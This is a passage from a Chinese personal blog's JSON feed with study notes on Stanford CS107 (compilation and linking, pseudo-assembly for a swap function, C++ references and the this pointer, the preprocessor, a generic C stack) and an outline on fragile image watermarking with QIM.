punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Yeah!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>memory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>预处理后，将上述代码传递给 GCC，根据 makefile 编译器会对其进行编译，编译生成 .o 文件。编译文件中显然的会有以下内容。</p>\n<pre><code class=\"language-assembly\">...\nCALL &lt;malloc&gt;\n...\nCALL &lt;fprintf&gt;\n...\nCALL &lt;printf&gt;\n...\nCALL &lt;free&gt;\n...\nRV = 0;\nRET;\n</code></pre>\n<p>为什么没有 assert 函数的调用呢？因为经过预处理阶段，#include &lt;assert.h&gt; 就已经对所有的 assert 函数进行替换了，就没有 assert 函数了，对应的会有 fprintf 函数。</p>\n<p>随后 GCC 会对 o 文件进行链接操作，并最终生成可执行文件 .out 文件。如果只是想让编译器进行编译后就停止，需要使用  <code>gcc -c</code>  命令。如果想设置生成的可执行文件的名称，就使用  <code>gcc -o</code> 。</p>\n",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/20/%E5%9B%BE%E5%83%8F%E4%B8%8A%E8%84%86%E5%BC%B1%E6%80%A7%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0/",
            "url": "http://yanagi-kon.github.io/2023/11/20/%E5%9B%BE%E5%83%8F%E4%B8%8A%E8%84%86%E5%BC%B1%E6%80%A7%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0/",
            "title": "",
            "date_published": "2023-11-20T08:56:47.714Z",
            "content_html": "<h1 id=\"图像上脆弱性数字水印\"><a class=\"markdownIt-Anchor\" href=\"#图像上脆弱性数字水印\">#</a> 图像上脆弱性数字水印</h1>\n<h2 id=\"任务\"><a class=\"markdownIt-Anchor\" href=\"#任务\">#</a> 任务</h2>\n<p><img data-src=\"%E5%9B%BE%E5%83%8F%E4%B8%8A%E8%84%86%E5%BC%B1%E6%80%A7%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0/image-20231120165648587.png\" alt=\"image-20231120165648587\"></p>\n<h2 id=\"脆弱性数字水印\"><a class=\"markdownIt-Anchor\" href=\"#脆弱性数字水印\">#</a> 脆弱性数字水印</h2>\n<p>脆弱性数字水印（Fragile Watermark）是一种数字水印技术，通常用于保护数字图像的完整性。与一般数字水印不同，脆弱性数字水印对图像的修改非常敏感，一旦图像被篡改，水印就会受到破坏，从而使得篡改更容易被检测到。</p>\n<p>脆弱性数字水印主要用于验证图像的完整性和真实性。它可以被嵌入到数字图像中，通常通过修改图像的像素或频域信息。当图像被篡改时，水印就会受到破坏，导致可视或计算上的变化。这种类型的数字水印对于需要确保图像未被篡改的场景非常有用，比如法庭上的数字图像证据、数字艺术品的保护等。</p>\n<p>分为空间域和频域的信息隐藏。</p>\n<h3 id=\"调研\"><a class=\"markdownIt-Anchor\" href=\"#调研\">#</a> 调研</h3>\n<h4 id=\"5-qim\"><a class=\"markdownIt-Anchor\" href=\"#5-qim\">#</a> 5. QIM</h4>\n<p><strong>Quantization Index Modulation</strong>：量化索引调制</p>\n<ul>\n<li>\n<p>空域</p>\n</li>\n<li>\n<p>原理</p>\n<blockquote>\n<p>根据水印信息，把原始载体数据用量化器量化到不同的索引区间，水印检测时则根据调制后的数据所属的量化索引区间来识别水印信息</p>\n</blockquote>\n<ul>\n<li>二值量化索引调制\n<ul>\n<li>按照待嵌入的二进制水印 比特 b∈+1,−1�∈+1,−1，选择使用两个均匀量化器中的一个对载体信号进行量化处理</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p><strong>基于量化思想的水印嵌入模型</strong>的主要目的是<strong>为了实现盲检测</strong>。其主要思想是<strong>根据水印信息的不同将原始载体数据量化到不同的量化区间</strong>，而<strong>检测时根据所属的量化区间来识别水印信息</strong>。</p>\n<p>常见的两种量化方式是 QIM 和 SCS 方法，前一种方法是稳健的，主要用于版权保护后一种方法是脆弱的，主要用于内容认证。</p>\n<hr>\n<p>QIM 的<strong>主要思想</strong>：将坐标轴等间隔划分成 A 区间集与 B 区间集，区间大小为△。规定 A 区间集代表 0,B 区间集代表 0, 根据水印值是 0 或 1, 调整待嵌入水印的值，使其等于离自己最近的对应区间内的中间值，当检测水印时，只需判断该数值落在的区间是 A 集还是 B 集，就可以得到对应的水印信息是 0 或 1。</p>\n</blockquote>\n</li>\n<li>\n<p>实现</p>\n<p><img data-src=\"%E5%9B%BE%E5%83%8F%E4%B8%8A%E8%84%86%E5%BC%B1%E6%80%A7%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0/qim1.png\" alt=\"img1\"></p>\n</li>\n</ul>\n<p><img data-src=\"%E5%9B%BE%E5%83%8F%E4%B8%8A%E8%84%86%E5%BC%B1%E6%80%A7%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0/qim2.png\" alt=\"img2\"></p>\n<p>* 鲁棒性</p>\n<blockquote>\n<p>QIM 算法在透明性好的前提下可以在椒盐噪声、中值滤波和剪切攻击下能正确提取水印信息，即 QIM 水印算法能在获取较小嵌入失真同时，具有较高的鲁棒性</p>\n</blockquote>\n<p><img data-src=\"%E5%9B%BE%E5%83%8F%E4%B8%8A%E8%84%86%E5%BC%B1%E6%80%A7%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0/qim.png\" alt=\"img3\"></p>\n<h3 id=\"方法\"><a class=\"markdownIt-Anchor\" href=\"#方法\">#</a> 方法</h3>\n<ol>\n<li>\n<p>空间域方法：LSB 方法</p>\n</li>\n<li>\n<p>变换域方法：DCT 变换域方法</p>\n</li>\n<li>\n<p>其他方法</p>\n</li>\n</ol>\n<h3 id=\"抗攻击性评估\"><a class=\"markdownIt-Anchor\" href=\"#抗攻击性评估\">#</a> 抗攻击性评估</h3>\n<h4 id=\"psnr\"><a class=\"markdownIt-Anchor\" href=\"#psnr\">#</a> PSNR</h4>\n<h4 id=\"nc\"><a class=\"markdownIt-Anchor\" href=\"#nc\">#</a> NC</h4>\n<h3 id=\"lsb方法\"><a class=\"markdownIt-Anchor\" href=\"#lsb方法\">#</a> LSB 方法</h3>\n<h3 id=\"dct方法\"><a class=\"markdownIt-Anchor\" href=\"#dct方法\">#</a> DCT 方法</h3>\n<h3 id=\"jsteg方法\"><a class=\"markdownIt-Anchor\" href=\"#jsteg方法\">#</a> JSTEG 方法</h3>\n",
            "tags": []
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/20/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_11/",
            "url": "http://yanagi-kon.github.io/2023/11/20/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_11/",
            "title": "斯坦福编程范式CS107_11",
            "date_published": "2023-11-20T00:28:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_11\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_11\">#</a> 斯坦福编程范式 CS107_11</h1>\n<h2 id=\"c的汇编\"><a class=\"markdownIt-Anchor\" href=\"#c的汇编\">#</a> C++ 的汇编</h2>\n<h3 id=\"构造一个foo函数\"><a class=\"markdownIt-Anchor\" href=\"#构造一个foo函数\">#</a> 构造一个 foo 函数</h3>\n<pre><code class=\"language-c++\">void foo()&#123;\n    int x;\n    int y;\n    x = 11;\n    y = 17;\n    swap(&amp;x,&amp;y);\n&#125;\n</code></pre>\n<p>汇编代码</p>\n<pre><code class=\"language-assembly\">SP = SP - 8;\nM[SP + 4] = 11;\nM[SP] = 17;\n\nR1 = SP;\t\t//&amp;y\nR2 = SP + 4;\t//&amp;x\nSP = SP - 8;\t//为参数申请空间 参数的地址是从右向左看是高地址到低地址\nM[SP] = R2;\nM[SP + 4] = R1;\nCALL&lt;swap&gt;\t\t//调用的同时会将PC值存储起来，以便调用完毕返回\nSP = SP + 8;\t//释放空间\n\nSP = SP + 8;\nRET;\n</code></pre>\n<h3 id=\"构造一个swap函数\"><a class=\"markdownIt-Anchor\" href=\"#构造一个swap函数\">#</a> 构造一个 swap 函数</h3>\n<pre><code class=\"language-c++\">void swap(int *ap,int *bp)&#123;\n    int temp = *ap;\n    *ap = *bp;\n    *bp = temp;\n&#125;\n</code></pre>\n<p>汇编代码</p>\n<pre><code class=\"language-assembly\">&lt;swap&gt;\nSP = SP - 4;\t//为temp申请空间\nR1 = M[SP + 8];\t//ap\nR2 = M[R1];\t\t//*ap 对ap解引用\nM[SP] = R2;\t\t//temp = *ap\n\nR1 = M[SP+12];\nR2 = M[R1];\nR3 = M[SP + 8];\nM[R3] = R2;\n\nR1 = M[SP];\nR2 = M[SP + 12];\nM[R2] = R1;\n\nSP = SP + 4;\nRET;\n</code></pre>\n<p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_11/image-20231120101907084.png\" alt=\"image-20231120101907084\"></p>\n<p>从这个例子中我们可以看出来，C++ 和 C 语言的汇编过程没有什么大的区别。</p>\n<h3 id=\"c语言实现swap函数\"><a class=\"markdownIt-Anchor\" href=\"#c语言实现swap函数\">#</a> C 语言实现 swap 函数</h3>\n<p>通过 <code>引用</code> 进行变量值的交换。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> <span class=\"token operator\">&amp;</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> temp <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    a <span class=\"token operator\">=</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    b <span class=\"token operator\">=</span> temp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> y<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token number\">11</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>y <span class=\"token operator\">=</span> <span class=\"token number\">17</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">swap</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>在这里 x 和 y 没有写 &amp; 符号，但是编译器会根据函数原型去寻找线索，然后理解这里应该传入的是一个引用类型，会自动去取这两个变量的地址。表面上看传递的是引用，实际上传递的是指针，会自动对所有引用的指针进行解引用操作。所以这里的 swap 函数的汇编代码，和上边 C++ 的汇编代码是完全一致的。</p>\n<h3 id=\"一个简单的引用类型的例子\"><a class=\"markdownIt-Anchor\" href=\"#一个简单的引用类型的例子\">#</a> 一个简单的引用类型的例子：</h3>\n<p>对于 <code>int &amp;z = y</code> ，虽然 y 没有加 &amp;，但是编译器会自动传入它的地址给 z。只不过编译器最终为 z 留出的空间是和 y 联系起来了。</p>\n<p>对于 <code>int *z = &amp;y</code> ，这时将图示中的阴影部分抹去就好了。</p>\n<p>这两种代码，从汇编的角度来看其实是一样的。但是在 C 和 C++ 的层面来看，一个需要显式的写上一个 *，而另一个则不必。那么如果引用就是指针的话，那么为什么还要使用实际的指针呢？引用确实很方便，尤其是它给人们一种假象将这个名字作为某个其他地方声明的变量的别名。但是使用引用的话，一旦赋值就不能将引用重新绑定给新的左值，就是说现在已经无法放弃 z 与 y 的绑定，而重新与 x 绑定了。你不能灵活的改变这个箭头以及这个箭头所指向的地址。但是指针是可以随意改变的。所以如果只是使用引用是没有办法很容易的构造出一个链表的。</p>\n<p>所以对于一个引用类型的变量，就把它当作是一个普通的变量进行操作就好，不用考虑指针，系统会自动进行解引用操作。</p>\n<p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_11/image-20231120103944491.png\" alt=\"image-20231120103944491\"></p>\n<p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_11/Snipaste_2023-11-20_10-55-36-17004492748102.png\" alt=\"Snipaste_2023-11-20_10-55-36\"></p>\n<h3 id=\"c和c的区别\"><a class=\"markdownIt-Anchor\" href=\"#c和c的区别\">#</a> C 和 C++ 的区别</h3>\n<p><code>很多人在使用C++的时候，他们还是在使用C加上一些引用和对象，只是他们偶尔使用对象和引用罢了。他们不使用继承，也不怎么使用模板，不适用C++中一些很好的方法。这样其实不是面向对象的方式。</code></p>\n<p>在 C<ins> 中，结构体也可以有方法。在 C</ins> 中唯一的区别对于结构体和类来说就是：对于类默认的访问修饰符是 private 的，而对于结构体来说默认的访问修饰符是 public。编译器对这两个语法结构差不多是等同对待的，它们的不同只是在最开始有一个转换语句，它会问 “这是一个 struct 还是一个 class 呢？”</p>\n<p>我们现在来考虑一个类，先不管构造函数和析构函数。</p>\n<pre><code class=\"language-c++\">class binky&#123;\n    public:\n\n    \n    private:\n    \tint winky;\n    \tchar *blinky;\n    \tchar slinky[8];\n&#125;;\n</code></pre>\n<p>这三个变量就是它唯一的数据域了。每当你声明一个这种 binky 类型的记录，只需要</p>\n<pre><code class=\"language-c++\">binky b;\n</code></pre>\n<p>就可以了。它其实是一块内存，里面紧挨着存放着 3 个成员域，这三个域打包存放在一个矩形区域，并且从上到下的顺序是：slinky、blinky、winky</p>\n<p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_11/image-20231120111355995.png\" alt=\"image-20231120111355995\"></p>\n<p>我们现在对类添加几个方法。为什么它们能够访问到 slinky 或者 winky 成员？</p>\n<pre><code class=\"language-c++\">class binky&#123;\n    public:\n    \tint dunky(int x, int y);\n   \t\tchar * minky(int *z)&#123;\n            int w = *z;\n            return slinky + dunky(winky,winky);\n        &#125;\n    \n    private:\n    \tint winky;\n    \tchar *blinky;\n    \tchar slinky[8];\n&#125;;\n</code></pre>\n<p>当我们调用 minky 函数的时候，参数其实并不是一个，而是两个，编译器会将某个 binky 类对象的地址传进去作为函数的 <code>第0个参数</code> 。因此此时的内存空间中，在 Saved PC 之上有两个参数，一个是  <code>this</code>  指针，另一个是 z</p>\n<pre><code class=\"language-c++\">int n = 17;\nbinky b;\nb.minky(&amp;n);\n//实际上： binky::minky(&amp;b,&amp;n);\n</code></pre>\n<p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_11/image-20231120112546950.png\" alt=\"image-20231120112546950\"></p>\n<p>随后进行函数内局部变量空间的申请。</p>\n<p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_11/image-20231120112815586.png\" alt=\"image-20231120112815586\"></p>\n<p>同理，在随后调用  dunky (winky,winky) 的时候，传入的参数是 3 个，而不是 2 个。</p>\n<h3 id=\"c类中的-static方法\"><a class=\"markdownIt-Anchor\" href=\"#c类中的-static方法\">#</a> C++ 类中的 static 方法</h3>\n<p>下面的求两个数的最大公约数的函数，它和普通的函数没有区别，它不需要使用 类 fraction 中的任何变量，因此它没有 this 指针，因此我们可以将它写成一个 static 。在 C++ 的一个类中将一个方法设置成 static 意味着调用它的时候，并不需要类的实例作为参数，你可以将它当作一个单独的函数来调用，而实际上它也确实是一个普通函数，只不过它的作用域是在类的定义中。但是 static 不能被继承。</p>\n<pre><code class=\"language-c++\">class fraction &#123;\n    public:\n    \tfraction(int n,int d = 1);\n    \n    \tvoid reduce();\n    \n    private:\n    \tstatic int gcd(int x,int y);\t\n&#125;\n</code></pre>\n<h3 id=\"编译与链接的工作原理\"><a class=\"markdownIt-Anchor\" href=\"#编译与链接的工作原理\">#</a> 编译与链接的工作原理</h3>\n<p>make 命令。使用 make 命令时，首先调用预处理器，预处理器一般用来处理 #define 和 #include 预处理指令，然后才是调用所谓的编译器，编译器负责将你的 <code>.C</code>  文件以及 <code>.cc</code>  生成对应的 <code>.o</code>  文件，这些文件在我们敲下 make 命令后就会在我们的目录下生成。之后进行链接操作，对 <code>.o</code>  文件进行链接，它会将一系列的 <code>.o</code>  文件按照顺序排序列起来，并且确保在执行过程中任何的调用函数都能够从该函数所在的 <code>.o</code>  文件中找到。之后生成可执行文件。</p>\n<h4 id=\"预处理器一部分\"><a class=\"markdownIt-Anchor\" href=\"#预处理器一部分\">#</a> 预处理器 (一部分)</h4>\n<p>在 C 语言中定义一个全局变量，一般使用 #define</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">kWidth</span> <span class=\"token expression\"><span class=\"token number\">480</span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">kHeight</span> <span class=\"token expression\"><span class=\"token number\">720</span></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Width is %d.\\n\"</span><span class=\"token punctuation\">,</span>kWidth<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> area <span class=\"token operator\">=</span> kWidth <span class=\"token operator\">*</span> kHeight<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>预处理器读取到带有 # 的行时，预处理器内部会有某个 hashset，将 kWidth 作为 key，将 480 作为值进行链接。随后预处理器继续读程序，并将它所遇到的 kWidth 进行单纯的文字替换为 480，就好像你本来就写的是 480 一样。并且预处理器甚至不知道 480 是一个数，它只是认为是 4、8、0 字符拼接。</p>\n",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_7/",
            "url": "http://yanagi-kon.github.io/2023/11/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_7/",
            "title": "斯坦福编程范式CS107_7",
            "date_published": "2023-11-19T00:28:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_7\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_7\">#</a> 斯坦福编程范式 CS107_7</h1>\n<h2 id=\"使用栈来操纵字符串\"><a class=\"markdownIt-Anchor\" href=\"#使用栈来操纵字符串\">#</a> 使用栈来操纵字符串</h2>\n<p>接着上节课的栈的结构体</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elems<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 泛型中并不知道类型占用字节的大小，所以需要指定</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> loglength<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">int</span> alloclength<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span>stack<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackDispose</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPush</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elemAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPop</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elemAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>以下是 main 函数内容</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> friends<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"Al\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Bob\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Carl\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    stack stringStack<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>stringStack<span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>copy <span class=\"token operator\">=</span> <span class=\"token function\">strdup</span><span class=\"token punctuation\">(</span>friends<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 调用 strdup 会使用 malloc 函数，这和后面我们使用 free 函数是呼应的</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">StackPush</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>stringStack<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>copy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i <span class=\"token operator\">&lt;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token function\">StackPop</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>stringStack<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">StackDispose</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>stringStack<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在上述例子中，如何构造 StackDispose 使其能够完全的将栈中的特殊元素，诸如指针元素中指针所指的内容传递给 free 函数释放动态申请的内存较为难以实现，下面进行实现。</p>\n<h3 id=\"stackh\"><a class=\"markdownIt-Anchor\" href=\"#stackh\">#</a> stack.h</h3>\n<p>在结构体中新增加了一个 void 函数。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elems<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 泛型中并不知道类型占用字节的大小，所以需要指定</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> loglength<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">int</span> alloclength<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>freefn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span>stack<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackDispose</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPush</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token 